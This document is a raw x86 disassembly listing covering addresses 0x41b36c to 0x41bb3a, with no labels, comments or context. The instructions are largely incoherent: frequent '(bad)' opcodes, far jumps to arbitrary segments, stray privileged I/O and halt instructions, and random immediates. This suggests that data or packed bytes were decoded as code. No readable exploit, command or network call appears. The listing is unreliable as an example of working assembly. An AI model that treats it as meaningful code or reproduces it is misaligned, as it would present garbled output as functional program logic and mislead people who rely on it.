  41b36c:	test   al,0xca
  41b36e:	mov    esp,0xf6cbcdee
  41b373:	sar    ebx,cl
  41b375:	cmc    
  41b376:	mov    ebx,0xe2c4e8e5
  41b37b:	jmp    0xe7168c6f
  41b380:	(bad)  
  41b381:	cmc    
  41b382:	loope  0x41b359
  41b384:	push   es
  41b385:	call   0x71aad54
  41b38a:	jmp    0xdca4:0xccf3e8d9
  41b391:	mov    ch,0xc2
  41b393:	(bad)
  41b396:	clc    
  41b397:	fcmovbe st,st(3)
  41b399:	call   0xbd13899a
  41b39e:	(bad)  
  41b3a0:	rol    ebp,0xf9
  41b3a3:	retf   
  41b3a4:	sar    edi,0xdc
  41b3a7:	iret   
  41b3a8:	push   es
  41b3a9:	or     al,0x6
  41b3ab:	jecxz  0x41b370
  41b3ad:	lock out 0xc4,eax
  41b3b0:	mov    ch,0xec
  41b3b2:	fcmove st,st(4)
  41b3b4:	(bad)  
  41b3b5:	lock jmp 0x41b384
  41b3b8:	jmp    0xd31e7291
  41b3bd:	std    
  41b3be:	fcmovbe st,st(0)
  41b3c0:	xlat   BYTE PTR ds:[ebx]
  41b3c1:	(bad)  
  41b3c3:	rol    BYTE PTR [esp+edx*8],cl
  41b3c6:	out    0x7,al
  41b3c8:	out    0x9,al
  41b3ca:	or     al,BYTE PTR [eax]
  41b3cc:	retf   
  41b3cd:	retf   0xf5e3
  41b3d0:	retf   0xb7f2
  41b3d3:	in     eax,dx
  41b3d4:	rcr    edi,0xd3
  41b3d7:	mov    ecx,0x1ccccc9
  41b3dc:	idiv   esp
  41b3de:	out    0xdb,eax
  41b3e0:	shl    edx,1
  41b3e2:	add    DWORD PTR [edi],eax
  41b3e4:	jmp    0x41b3cd
  41b3e6:	out    dx,eax
  41b3e7:	loopne 0x41b3c1
  41b3e9:	hlt    
  41b3ea:	add    al,0xd2
  41b3ec:	into   
  41b3ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b3ee:	out    0xf3,eax
  41b3f0:	loope  0x41b3b9
  41b3f2:	in     eax,dx
  41b3f3:	lds    esi,FWORD PTR [ebp-0x4932082f]
  41b3f9:	fdivr  st(1),st
  41b3fb:	mov    esi,0xe1dffcd2
  41b400:	aad    0xfc
  41b402:	ret    
  41b403:	mov    eax,0xfcfffac5
  41b408:	cld    
  41b409:	jecxz  0x41b419
  41b40b:	jmp    0xd2b1:0xc1e5c0ed
  41b412:	int3   
  41b413:	repnz mov edx,0xb9bac8c9
  41b419:	xlat   BYTE PTR ds:[ebx]
  41b41a:	aad    0xc9
  41b41c:	mov    edx,0x7b9fa
  41b421:	mov    esi,0xcbdeb803
  41b426:	out    dx,al
  41b427:	loopne 0x41b417
  41b429:	in     eax,0xe7
  41b42b:	retf   0xedcb
  41b42e:	into   
  41b42f:	int3   
  41b430:	(bad)  
  41b431:	rep lods eax,DWORD PTR ds:[esi]
  41b433:	(bad)
  41b436:	out    0xd8,eax
  41b438:	(bad)  
  41b43a:	ret    
  41b43b:	sti    
  41b43c:	mov    edi,0xd6bedfda
  41b441:	loop   0x41b415
  41b443:	hlt    
  41b444:	(bad)  
  41b446:	add    cl,dh
  41b448:	fsub   st(3),st
  41b44a:	dec    DWORD PTR [ecx]
  41b44c:	iret   
  41b44d:	out    dx,eax
  41b44e:	scas   al,BYTE PTR es:[edi]
  41b44f:	retf   
  41b450:	jmp    0xb8d0:0xb3cec8c0
  41b457:	std    
  41b458:	mov    ecx,0xbdecbb03
  41b45d:	mov    eax,0xcce4dfcc
  41b462:	add    al,0xc2
  41b464:	(bad)  
  41b466:	(bad)  
  41b467:	out    0xfc,eax
  41b469:	add    edx,DWORD PTR [edx]
  41b46b:	fdivrp st(0),st
  41b46d:	fsubp  st(3),st
  41b46f:	test   al,0xdc
  41b471:	(bad)
  41b474:	int    0xd8
  41b476:	icebp  
  41b477:	out    dx,eax
  41b478:	iret   
  41b479:	idiv   al
  41b47b:	fdivr  st(5),st
  41b47d:	cmc    
  41b47e:	stc    
  41b47f:	mov    ebp,0xc6e6d4d2
  41b484:	cli    
  41b485:	fiadd  DWORD PTR [esi]
  41b487:	out    dx,eax
  41b488:	cli    
  41b489:	(bad)  
  41b48b:	fidiv  DWORD PTR [ebx-0x171a3756]
  41b491:	ror    cl,cl
  41b493:	mov    ch,0xcb
  41b495:	ror    ah,1
  41b497:	fsubr  st,st(3)
  41b499:	sti    
  41b49a:	cmc    
  41b49b:	rcl    bl,cl
  41b49d:	iret   
  41b49e:	repz loope 0x41b49a
  41b4a1:	or     ebp,ebx
  41b4a3:	rol    al,cl
  41b4a5:	in     al,0xe9
  41b4a7:	cld    
  41b4a8:	or     eax,0xd8ebf8fc
  41b4ad:	shl    bh,1
  41b4af:	out    0xb6,al
  41b4b1:	out    dx,al
  41b4b2:	shr    esp,0xcd
  41b4b5:	jmp    0xe921948f
  41b4ba:	fstp   st(6)
  41b4bc:	mov    ebp,0xecdc03bd
  41b4c1:	jecxz  0x41b4a7
  41b4c3:	fild   WORD PTR [ecx]
  41b4c5:	fcomp  st(3)
  41b4c7:	hlt    
  41b4c8:	pop    es
  41b4c9:	out    dx,al
  41b4ca:	retf   0xf1d8
  41b4cd:	leave  
  41b4ce:	shr    ebx,cl
  41b4d0:	enter  0xe6c3,0xc4
  41b4d4:	retf   0xecce
  41b4d7:	mov    esi,0xf2deddc4
  41b4dc:	(bad)  
  41b4de:	aad    0xf7
  41b4e0:	mov    ebx,0xc3c70ad3
  41b4e5:	cli    
  41b4e6:	enter  0x709,0xe2
  41b4ea:	adc    ch,ah
  41b4ec:	icebp  
  41b4ed:	loope  0x41b494
  41b4ef:	icebp  
  41b4f0:	int3   
  41b4f1:	shl    ch,1
  41b4f3:	lock mov bl,0xee
  41b4f6:	mov    al,0xe9
  41b4f8:	fucomi st,st(4)
  41b4fa:	mov    edi,0xdbc0b7d3
  41b4ff:	mov    DWORD PTR [esp+ebx*8],0xbf4f7f6
  41b506:	add    al,ah
  41b508:	iret   
  41b509:	jecxz  0x41b508
  41b50b:	icebp  
  41b50c:	icebp  
  41b50d:	lods   al,BYTE PTR ds:[esi]
  41b50e:	lods   al,BYTE PTR ds:[esi]
  41b50f:	sar    BYTE PTR [edi+esi*8-0x130a1d14],cl
  41b516:	retf   0xf8c6
  41b519:	fdiv   st(3),st
  41b51b:	(bad)  
  41b51c:	fadd   st(1),st
  41b51e:	loope  0x41b525
  41b520:	cli    
  41b521:	sti    
  41b522:	inc    DWORD PTR [eax]
  41b524:	add    ecx,DWORD PTR [ebx]
  41b526:	jmp    ecx
  41b528:	add    ebp,edi
  41b52a:	std    
  41b52b:	or     ebp,DWORD PTR [eax-0x42513456]
  41b531:	jmp    0x41b52a
  41b533:	stc    
  41b534:	mov    ah,0xf8
  41b536:	lds    edi,FWORD PTR [ecx-0x1093027]
  41b53c:	loop   0x41b537
  41b53e:	std    
  41b53f:	out    0xf4,al
  41b541:	fisttp QWORD PTR [edx]
  41b543:	jecxz  0x41b520
  41b545:	(bad)  
  41b546:	loop   0x41b523
  41b548:	fmul   st(2),st
  41b54a:	or     ah,dl
  41b54c:	rcl    edx,1
  41b54e:	mov    bl,0xcb
  41b550:	mov    dh,0xcf
  41b552:	mov    ch,0xb1
  41b554:	into   
  41b555:	mul    dh
  41b557:	aad    0xda
  41b559:	rcr    esp,1
  41b55b:	mov    esp,0xdad6f0ba
  41b560:	ret    
  41b561:	in     al,dx
  41b562:	or     esi,eax
  41b564:	(bad)  
  41b566:	loope  0x41b53e
  41b568:	aam    0xe5
  41b56a:	or     eax,0xe9e6d0e5
  41b56f:	lods   al,BYTE PTR ds:[esi]
  41b570:	ret    
  41b571:	in     eax,0xb4
  41b573:	repz jmp 0x41b568
  41b576:	mov    ah,0xfa
  41b578:	int    0xca
  41b57a:	jmp    0xfbbe:0xe100f0ea
  41b581:	(bad)  
  41b582:	std    
  41b583:	in     al,0xc3
  41b585:	(bad)  
  41b586:	out    0xc7,eax
  41b588:	in     al,0xe7
  41b58a:	repnz icebp 
  41b58c:	stos   DWORD PTR es:[edi],eax
  41b58d:	shl    esi,0xca
  41b590:	mov    esp,0xfba8e3f1
  41b595:	lock fidivr WORD PTR [ecx-0x2d030224]
  41b59c:	faddp  st(2),st
  41b59e:	inc    BYTE PTR ds:0xd7fde3d2
  41b5a4:	loopne 0x41b589
  41b5a6:	out    dx,al
  41b5a7:	cli    
  41b5a8:	fcomp  st(6)
  41b5aa:	(bad)  
  41b5ac:	repz retf 
  41b5ae:	lods   al,BYTE PTR ds:[esi]
  41b5af:	loopne 0x41b588
  41b5b1:	loopne 0x41b569
  41b5b3:	repz retf 
  41b5b5:	fcmovb st,st(7)
  41b5b7:	xlat   BYTE PTR ds:[ebx]
  41b5b8:	test   dl,0xeb
  41b5bb:	(bad)  
  41b5bc:	icebp  
  41b5bd:	loope  0x41b5b4
  41b5bf:	(bad)  
  41b5c0:	(bad)  
  41b5c1:	fcomp  st(6)
  41b5c3:	rol    cl,1
  41b5c5:	jmp    0x41b5a9
  41b5c7:	(bad)  
  41b5c8:	fstp   st(0)
  41b5ca:	fsubr  st(0),st
  41b5cc:	lods   eax,DWORD PTR ds:[esi]
  41b5cd:	out    0xe9,al
  41b5cf:	lods   al,BYTE PTR ds:[esi]
  41b5d0:	out    0xcf,al
  41b5d2:	vaddsubps xmm3,xmm5,xmm2
  41b5d6:	jmp    0xdfbe:0xf2d8eacd
  41b5dd:	(bad)  
  41b5de:	add    al,BYTE PTR [ebx]
  41b5e0:	mov    edi,0xd4f2ebff
  41b5e5:	cmc    
  41b5e6:	(bad)  
  41b5e7:	sti    
  41b5e8:	(bad)  
  41b5e9:	out    dx,eax
  41b5ea:	sti    
  41b5eb:	out    0xc7,al
  41b5ed:	out    dx,eax
  41b5ee:	into   
  41b5ef:	test   al,0xab
  41b5f1:	repnz (bad) 
  41b5f3:	rcr    ebx,cl
  41b5f5:	out    0xcc,eax
  41b5f7:	(bad)  
  41b5f8:	int    0xd4
  41b5fa:	mov    ch,0xf6
  41b5fc:	mov    edi,0xffddfdcc
  41b601:	add    ebx,esp
  41b603:	fmulp  st(1),st
  41b605:	call   0xe510ba08
  41b60a:	or     eax,0xe8e7c3d3
  41b60f:	out    0xee,al
  41b611:	leave  
  41b612:	lods   eax,DWORD PTR ds:[esi]
  41b613:	(bad)  
  41b614:	(bad)  
  41b615:	mov    bh,0xd4
  41b617:	repz mov edi,0xd8d1bbf6
  41b61d:	fnstsw WORD PTR [esi-0x1c0bfc03]
  41b623:	rcl    al,1
  41b625:	loop   0x41b61c
  41b627:	out    0xe7,eax
  41b629:	(bad)  
  41b62b:	out    0xb9,al
  41b62d:	repz mov al,0xd5
  41b630:	cmc    
  41b631:	ret    
  41b632:	ret    0xd9e4
  41b635:	stc    
  41b636:	mov    al,0xe6
  41b638:	mov    eax,0xfdd6ddbf
  41b63d:	mov    edi,0xdafde7db
  41b642:	clc    
  41b643:	icebp  
  41b644:	or     edx,esi
  41b646:	add    DWORD PTR [esi],ecx
  41b648:	jmp    0x41b624
  41b64a:	sti    
  41b64b:	int3   
  41b64c:	(bad)  
  41b64d:	jmp    0xc1377f45
  41b652:	(bad)
  41b655:	dec    ebp
  41b657:	not    dh
  41b659:	jmp    0x41b653
  41b65b:	std    
  41b65c:	mov    esi,0xf8f1becd
  41b661:	in     al,0xda
  41b663:	ret    
  41b664:	add    bh,dl
  41b666:	push   cs
  41b667:	push   cs
  41b668:	out    dx,eax
  41b669:	hlt    
  41b66a:	adc    cl,ch
  41b66c:	ret    0xdcd2
  41b66f:	test   al,0xed
  41b671:	hlt    
  41b672:	rol    dl,cl
  41b674:	scas   eax,DWORD PTR es:[edi]
  41b675:	into   
  41b676:	mov    ah,0xeb
  41b678:	std    
  41b679:	ror    cl,1
  41b67b:	add    al,BYTE PTR [eax]
  41b67d:	in     eax,dx
  41b67e:	aad    0xe2
  41b680:	lock add al,0xff
  41b683:	add    al,ch
  41b685:	pop    es
  41b686:	retf   
  41b687:	enter  0xeb00,0xe
  41b68b:	fld    st(4)
  41b68d:	test   eax,0xd1acebeb
  41b692:	enter  0xcdee,0xef
  41b696:	in     eax,0xe6
  41b698:	sti    
  41b699:	retf   0xccc3
  41b69c:	jmp    0x70ea5a1
  41b6a1:	fcmovu st,st(3)
  41b6a3:	(bad)  
  41b6a4:	mov    edi,0xed0dfcf6
  41b6a9:	in     al,0xc5
  41b6ab:	clc    
  41b6ac:	int3   
  41b6ad:	lds    ebp,FWORD PTR [eax-0x8354e23]
  41b6b3:	loope  0x41b67f
  41b6b5:	clc    
  41b6b6:	fld    st(5)
  41b6b8:	stc    
  41b6b9:	ror    eax,cl
  41b6bb:	stc    
  41b6bc:	xlat   BYTE PTR ds:[ebx]
  41b6bd:	enter  0xb8cf,0xd5
  41b6c1:	int3   
  41b6c2:	fcmovu st,st(5)
  41b6c4:	hlt    
  41b6c5:	fld    QWORD PTR [ebx]
  41b6c7:	call   0xdd509e96
  41b6cc:	lods   eax,DWORD PTR ds:[esi]
  41b6cd:	mul    edx
  41b6cf:	imul   ecx
  41b6d1:	retf   0xe9ea
  41b6d4:	sti    
  41b6d5:	stc    
  41b6d6:	(bad)  
  41b6d8:	mov    esi,0xbdf9f5b4
  41b6dd:	cmc    
  41b6de:	fistp  QWORD PTR [esi-0x1afcfd34]
  41b6e4:	in     al,0xeb
  41b6e6:	pop    es
  41b6e7:	(bad)  
  41b6e8:	(bad)  
  41b6ea:	adc    bl,dh
  41b6ec:	stos   DWORD PTR es:[edi],eax
  41b6ed:	mov    cl,0xed
  41b6ef:	retf   
  41b6f0:	mov    dh,0xe6
  41b6f2:	out    dx,eax
  41b6f3:	out    dx,al
  41b6f4:	fcmovu st,st(2)
  41b6f6:	enter  0xbbde,0xcb
  41b6fa:	enter  0xd2b9,0xf8
  41b6fe:	out    dx,al
  41b6ff:	fcmovnbe st,st(7)
  41b701:	ret    0xf4da
  41b704:	ret    0xe1d5
  41b707:	loope  0x41b6f2
  41b709:	out    dx,al
  41b70a:	or     esi,ebx
  41b70c:	fadd   st(6),st
  41b70e:	mov    esp,0xc7e0bcc0
  41b713:	sti    
  41b714:	int3   
  41b715:	out    dx,eax
  41b716:	rcl    esi,cl
  41b718:	lock fucomip st,st(7)
  41b71b:	hlt    
  41b71c:	(bad)  
  41b71e:	into   
  41b71f:	add    al,BYTE PTR [edx]
  41b721:	xlat   BYTE PTR ds:[ebx]
  41b722:	mov    ebp,0xf7f7ded9
  41b727:	pop    es
  41b728:	jmp    0x41b731
  41b72a:	adc    al,BYTE PTR [eax]
  41b72c:	out    dx,al
  41b72d:	test   eax,0xc2c2ebae
  41b732:	jmp    0xc9dd:0xefc9ece6
  41b739:	retf   0xd5f2
  41b73c:	mov    esi,0xd605f2bf
  41b741:	(bad)  
  41b742:	rcr    esp,0xc0
  41b745:	leave  
  41b746:	(bad)  
  41b748:	fsubrp st(1),st
  41b74a:	cli    
  41b74b:	add    ah,bl
  41b74d:	fmul   st(7),st
  41b74f:	retf   0xe7d0
  41b752:	in     eax,dx
  41b753:	shl    dh,cl
  41b755:	fsubr  st,st(7)
  41b757:	int    0xd7
  41b759:	cmc    
  41b75a:	add    edx,eax
  41b75c:	clc    
  41b75d:	repz loope 0x41b71c
  41b760:	mov    edi,0x404c3c7
  41b765:	add    ebp,ebx
  41b767:	leave  
  41b768:	fsubrp st(7),st
  41b76a:	movntq (bad),mm1
  41b76b:	out    0xcf,eax
  41b76d:	leave  
  41b76e:	in     al,0xae
  41b770:	fmul   st(2),st
  41b772:	leave  
  41b773:	mov    dl,0xe0
  41b775:	icebp  
  41b776:	out    dx,al
  41b777:	jmp    0xedd1:0xfbc3dded
  41b77e:	cmc    
  41b77f:	mov    esp,0xc204ddd6
  41b784:	cli    
  41b785:	std    
  41b786:	sti    
  41b787:	dec    cl
  41b789:	in     eax,dx
  41b78a:	(bad)  
  41b78b:	shr    DWORD PTR [ebx+ecx*8-0x5553192d],cl
  41b792:	ret    
  41b793:	test   eax,0xb7f0b9c9
  41b799:	jmp    0xf1f4:0xc1c1ffb1
  41b7a0:	int3   
  41b7a1:	(bad)  
  41b7a2:	repnz retf 
  41b7a4:	jmp    0xdc2cb8ad
  41b7a9:	hlt    
  41b7aa:	stc    
  41b7ab:	loope  0x41b773
  41b7ad:	shl    bh,1
  41b7af:	scas   al,BYTE PTR es:[edi]
  41b7b0:	mov    ch,0xc0
  41b7b2:	leave  
  41b7b3:	shl    ecx,cl
  41b7b5:	cmc    
  41b7b6:	jmp    0xb90a968c
  41b7bb:	mov    ebx,0x2dfe7df
  41b7c0:	add    al,dh
  41b7c2:	or     edx,esi
  41b7c4:	fxch   st(3)
  41b7c6:	neg    ebx
  41b7c8:	loopne 0x41b7b0
  41b7ca:	(bad)  
  41b7cc:	test   al,0xb1
  41b7ce:	in     al,0xd7
  41b7d0:	xlat   BYTE PTR ds:[ebx]
  41b7d1:	lods   al,BYTE PTR ds:[esi]
  41b7d2:	out    0xb5,al
  41b7d4:	fdiv   DWORD PTR [eax-0xb220a27]
  41b7da:	ret    
  41b7db:	fsubr  st,st(0)
  41b7dd:	fucomi st,st(7)
  41b7df:	icebp  
  41b7e0:	dec    BYTE PTR [ebx]
  41b7e2:	in     eax,0xdc
  41b7e4:	(bad)  
  41b7e5:	out    dx,eax
  41b7e6:	clc    
  41b7e7:	loope  0x41b7b4
  41b7e9:	(bad)  
  41b7eb:	pop    es
  41b7ec:	(bad)  
  41b7ed:	shl    BYTE PTR [ecx-0x33331b12],cl
  41b7f3:	mov    al,0xf1
  41b7f5:	jmp    0xb9f79cd4
  41b7fa:	mov    ebp,0xd1e1e9bb
  41b7ff:	mov    edi,0xf9b9d801
  41b804:	jmp    0xc4ec:0xcfd9de07
  41b80b:	in     al,0xa7
  41b80d:	enter  0xf2ed,0xd0
  41b811:	repz imul ecx
  41b814:	loope  0x41b810
  41b816:	hlt    
  41b817:	mov    esi,0xecdebfd5
  41b81c:	jecxz  0x41b7f2
  41b81e:	icebp  
  41b81f:	(bad)  
  41b821:	shl    ecx,cl
  41b823:	faddp  st(4),st
  41b825:	(bad)  
  41b827:	or     ebx,esp
  41b829:	fisttp WORD PTR [eax]
  41b82b:	call   0xb30296d9
  41b830:	aad    0xb7
  41b832:	in     al,dx
  41b833:	in     eax,dx
  41b834:	mov    dh,0xe6
  41b836:	aad    0xb6
  41b838:	clc    
  41b839:	mov    ah,0xec
  41b83b:	enter  0xbfde,0xd7
  41b83f:	call   eax
  41b841:	xlat   BYTE PTR ds:[ebx]
  41b842:	retf   
  41b843:	jmp    0x1d8:0x3d6d4c4
  41b84a:	in     eax,0xb
  41b84c:	repnz test al,0xcc
  41b84f:	mov    bh,0xb6
  41b851:	in     eax,0xc1
  41b853:	in     al,dx
  41b854:	mov    dh,0xee
  41b856:	mov    cl,0xb9
  41b858:	jmp    0xd1306d60
  41b85d:	(bad)  
  41b85f:	(bad)  
  41b860:	mov    esp,0xc9e4ebc7
  41b865:	jmp    0xe0cc:0xfafce8e0
  41b86c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b86d:	call   0xe3287c35
  41b872:	mov    dl,0xc8
  41b874:	fxch   st(4)
  41b876:	jmp    0xced3:0xf7c9fefa
  41b87d:	out    0xed,eax
  41b87f:	push   es
  41b880:	fucom  st(2)
  41b882:	ret    0x9f1
  41b885:	imul   edi
  41b887:	mov    esp,0xedcde0df
  41b88c:	out    dx,eax
  41b88d:	jmp    0xacf28784
  41b892:	fisubr DWORD PTR [eax-0x40042c50]
  41b898:	jmp    0x41b84c
  41b89a:	aam    0xf1
  41b89c:	xlat   BYTE PTR ds:[ebx]
  41b89d:	shr    edi,1
  41b89f:	fdivp  st(7),st
  41b8a1:	stc    
  41b8a2:	mov    esp,0xe2dbddda
  41b8a7:	or     ebp,ecx
  41b8a9:	out    dx,al
  41b8aa:	fisttp DWORD PTR [ebx]
  41b8ac:	mov    cl,0xac
  41b8ae:	in     al,dx
  41b8af:	(bad)  
  41b8b0:	sar    BYTE PTR [esp+esi*8-0x442d1409],0xd8
  41b8b8:	out    dx,eax
  41b8b9:	retf   
  41b8ba:	(bad)  
  41b8bc:	hlt    
  41b8bd:	in     eax,dx
  41b8be:	std    
  41b8bf:	in     eax,dx
  41b8c0:	loope  0x41b8b6
  41b8c2:	mov    ebp,0xcaf4d6c1
  41b8c7:	cld    
  41b8c8:	aam    0x3
  41b8ca:	fisttp WORD PTR [esi]
  41b8cc:	leave  
  41b8cd:	mov    dl,0xcf
  41b8cf:	(bad)  
  41b8d0:	mov    ebp,0xeda8d2ad
  41b8d5:	ror    bh,cl
  41b8d7:	call   0xd4058ed5
  41b8dc:	jecxz  0x41b89d
  41b8de:	mov    eax,0xffc5d2ec
  41b8e3:	jmp    0x41b8cd
  41b8e5:	aam    0x6
  41b8e7:	add    al,0xef
  41b8e9:	int    0xdf
  41b8eb:	fcomp  st(4)
  41b8ed:	repz shl cl,1
  41b8f0:	fmul   st(7),st
  41b8f2:	ror    esp,1
  41b8f4:	mov    al,0xd9
  41b8f6:	int    0xd7
  41b8f8:	int3   
  41b8f9:	mov    esi,0xd8d1dfcd
  41b8fe:	rol    DWORD PTR ds:0xf7d6e1df,0xca
  41b905:	cmc    
  41b906:	rcr    ebx,0xd4
  41b909:	iret   
  41b90a:	jmp    0xe2a8:0xcae3e8ec
  41b911:	shl    esi,cl
  41b913:	repz retf 0xadf1
  41b917:	aam    0xfa
  41b919:	sar    dh,1
  41b91b:	leave  
  41b91c:	neg    cl
  41b91e:	fnstsw WORD PTR [edi-0x2a07072c]
  41b924:	or     ch,dh
  41b926:	jmp    0xb048011
  41b92b:	in     al,0xc0
  41b92d:	mov    dl,0xce
  41b92f:	lds    esi,FWORD PTR [ebp-0x312b1e29]
  41b935:	mov    ebx,0xfdf8ecc8
  41b93a:	shl    al,1
  41b93c:	out    dx,al
  41b93d:	fmul   st,st(7)
  41b93f:	fcmovbe st,st(3)
  41b941:	sti    
  41b942:	fdivp  st(3),st
  41b944:	(bad)  
  41b946:	fsubrp st(5),st
  41b948:	std    
  41b949:	fsub   st,st(3)
  41b94b:	cli    
  41b94c:	scas   al,BYTE PTR es:[edi]
  41b94d:	lods   eax,DWORD PTR ds:[esi]
  41b94e:	shl    ebx,0xd2
  41b951:	enter  0xc8b3,0xb6
  41b955:	retf   0xc9ef
  41b958:	fdivr  st(1),st
  41b95a:	fidiv  DWORD PTR [eax+ebx*8-0x33fa3d2f]
  41b961:	repz hlt 
  41b963:	cmc    
  41b964:	cli    
  41b965:	jmp    0x80c:0xeacbfee4
  41b96c:	lods   al,BYTE PTR ds:[esi]
  41b96d:	xlat   BYTE PTR ds:[ebx]
  41b96e:	in     al,dx
  41b96f:	mov    esp,0xb4c4ecd0
  41b974:	scas   eax,DWORD PTR es:[edi]
  41b975:	shl    ah,1
  41b977:	hlt    
  41b978:	fcomip st,st(5)
  41b97a:	in     al,dx
  41b97b:	xlat   BYTE PTR ds:[ebx]
  41b97c:	loop   0x41b95d
  41b97e:	loopne 0x41b962
  41b980:	(bad)  
  41b981:	out    0xe2,eax
  41b983:	add    al,0xfc
  41b985:	jecxz  0x41b969
  41b987:	clc    
  41b988:	or     eax,0xf2cc06f4
  41b98d:	iret   
  41b98e:	mov    edi,0xedade7ce
  41b993:	(bad)  
  41b995:	(bad)  
  41b996:	in     al,0xbb
  41b998:	xlat   BYTE PTR ds:[ebx]
  41b999:	mov    dh,0xfe
  41b99b:	add    bl,dl
  41b99d:	loope  0x41b98e
  41b99f:	loop   0x41b95f
  41b9a1:	loopne 0x41b998
  41b9a3:	test   DWORD PTR [edx],0xded9c1e0
  41b9a9:	retf   
  41b9aa:	int    0xe5
  41b9ac:	fcomp  st(6)
  41b9ae:	out    0xcf,al
  41b9b0:	in     eax,dx
  41b9b1:	int3   
  41b9b2:	repnz test al,0xdb
  41b9b5:	retf   0xced5
  41b9b8:	std    
  41b9b9:	cli    
  41b9ba:	idiv   al
  41b9bc:	int    0xdc
  41b9be:	rcl    eax,0x0
  41b9c1:	repnz add edi,edx
  41b9c4:	rcl    al,1
  41b9c6:	aad    0xfc
  41b9c8:	or     dh,al
  41b9ca:	or     eax,0xc2c7a8e6
  41b9cf:	iret   
  41b9d0:	scas   al,BYTE PTR es:[edi]
  41b9d1:	(bad)  
  41b9d2:	(bad)  
  41b9d3:	mov    cl,0xbb
  41b9d5:	cmc    
  41b9d6:	fnstcw WORD PTR [ebx-0x2c4e0205]
  41b9dc:	sti    
  41b9dd:	mov    edi,0xf8d1e5e1
  41b9e2:	fcmovb st,st(0)
  41b9e4:	hlt    
  41b9e5:	fdivp  st(5),st
  41b9e7:	fild   WORD PTR [eax]
  41b9e9:	loope  0x41b9fe
  41b9eb:	out    dx,eax
  41b9ec:	loop   0x41b9ac
  41b9ee:	mov    esp,0xe3b0d4d6
  41b9f3:	retf   0xc0ba
  41b9f6:	repz fsin 
  41b9f9:	fucomip st,st(5)
  41b9fb:	add    cl,bh
  41b9fd:	fst    st(0)
  41b9ff:	mov    esi,0xcbfae0dd
  41ba04:	jmp    esp
  41ba06:	push   cs
  41ba07:	lds    ecx,FWORD PTR [edx]
  41ba09:	or     esi,ebp
  41ba0b:	or     ecx,esi
  41ba0d:	retf   0xaeec
  41ba10:	cmc    
  41ba11:	int    0xc2
  41ba13:	int    0xd5
  41ba15:	aad    0xbb
  41ba17:	mov    esi,0xdebaf0f8
  41ba1c:	out    dx,eax
  41ba1d:	cli    
  41ba1e:	repz loope 0x41ba0d
  41ba21:	add    ecx,esi
  41ba23:	push   es
  41ba24:	(bad)  
  41ba26:	in     eax,0xe3
  41ba28:	jecxz  0x41b9ef
  41ba2a:	add    cl,bh
  41ba2c:	test   eax,0xe5c9b2ed
  41ba31:	mov    bl,0xb7
  41ba33:	mov    ah,0xca
  41ba35:	sti    
  41ba36:	mov    eax,0xbebedbe4
  41ba3b:	loope  0x41ba32
  41ba3d:	(bad)  
  41ba3e:	jmp    edi
  41ba40:	shl    edx,cl
  41ba42:	push   es
  41ba43:	out    0xd4,eax
  41ba45:	xlat   BYTE PTR ds:[ebx]
  41ba46:	fneni(8087 only) 
  41ba48:	add    esp,edx
  41ba4a:	jmp    0xc510a91b
  41ba4f:	(bad)  
  41ba50:	lods   al,BYTE PTR ds:[esi]
  41ba51:	imul   esi
  41ba53:	test   al,0xce
  41ba55:	retf   0xd8b6
  41ba58:	iret   
  41ba59:	retf   0xfbf5
  41ba5c:	sti    
  41ba5d:	(bad)  
  41ba5e:	rcr    dl,1
  41ba60:	mov    esi,0xfbebfdf4
  41ba65:	(bad)  [esi]
  41ba67:	stc    
  41ba68:	leave  
  41ba69:	fcmovne st,st(0)
  41ba6b:	loope  0x41ba33
  41ba6d:	scas   eax,DWORD PTR es:[edi]
  41ba6e:	(bad)  
  41ba6f:	ror    cl,1
  41ba71:	ret    0xf3b0
  41ba74:	out    0xd5,al
  41ba76:	(bad)
  41ba79:	mov    esi,0xdcf4cad9
  41ba7e:	inc    dl
  41ba80:	rol    ch,1
  41ba82:	(bad)  
  41ba83:	fucomp st(3)
  41ba85:	rol    BYTE PTR [esi],1
  41ba87:	retf   
  41ba88:	or     al,0xe0
  41ba8a:	int    0xff
  41ba8c:	retf   
  41ba8d:	mov    bl,0xf7
  41ba8f:	fst    st(2)
  41ba91:	int    0xf7
  41ba93:	shr    ebx,0xf7
  41ba96:	rol    ebp,1
  41ba98:	call   0xca20897b
  41ba9d:	cmc    
  41ba9e:	repnz loop 0x41ba74
  41baa1:	int3   
  41baa2:	out    0xdf,eax
  41baa4:	rcr    esp,0x7
  41baa7:	clc    
  41baa8:	in     eax,0x6
  41baaa:	call   0xd814ab6f
  41baaf:	fnstsw WORD PTR [ebp-0x17082a31]
  41bab5:	mov    al,0xc9
  41bab7:	cmc    
  41bab8:	sar    bl,cl
  41baba:	leave  
  41babb:	icebp  
  41babc:	xlat   BYTE PTR ds:[ebx]
  41babd:	rcr    esi,1
  41babf:	mov    esi,0xf4bcfef9
  41bac4:	leave  
  41bac5:	fsqrt  
  41bac7:	fcomip st,st(5)
  41bac9:	cld    
  41baca:	shl    ebp,cl
  41bacc:	shr    BYTE PTR [edx-0x842281f],1
  41bad2:	jecxz  0x41bab4
  41bad4:	fnstcw WORD PTR [ecx-0x460c1438]
  41bada:	stc    
  41badb:	mov    ecx,0xe6b5cebf
  41bae0:	ret    
  41bae1:	inc    dh
  41bae3:	jmp    0xa0f:0xedc4c2c2
  41baea:	in     al,0xe1
  41baec:	enter  0xd2e3,0xee
  41baf0:	in     al,dx
  41baf1:	loopne 0x41bae9
  41baf3:	shl    al,cl
  41baf5:	hlt    
  41baf6:	in     al,0xf6
  41baf8:	mov    dh,0xf1
  41bafa:	loop   0x41bab0
  41bafc:	fcmovb st,st(1)
  41bafe:	(bad)  
  41baff:	fsubrp st(6),st
  41bb01:	aam    0xd6
  41bb03:	rcr    dh,0xc0
  41bb06:	(bad)  
  41bb07:	jmp    0xadc5:0xcbfee7c4
  41bb0e:	mov    bl,0xad
  41bb10:	shl    edi,1
  41bb12:	in     al,dx
  41bb13:	out    dx,al
  41bb14:	repz out dx,eax
  41bb16:	aam    0xf8
  41bb18:	clc    
  41bb19:	cld    
  41bb1a:	mov    edi,0xdac3ff02
  41bb1f:	pop    es
  41bb20:	loop   0x41bb01
  41bb22:	fadd   st,st(0)
  41bb24:	(bad)  
  41bb26:	or     bl,ah
  41bb28:	(bad)  
  41bb29:	paddsw mm7,mm0
  41bb2c:	scas   al,BYTE PTR es:[edi]
  41bb2d:	out    0xdf,al
  41bb2f:	mov    dh,0xee
  41bb31:	out    0xe4,al
  41bb33:	call   0xc93971f9
  41bb38:	int    0xb9
  41bb3a:	stc    
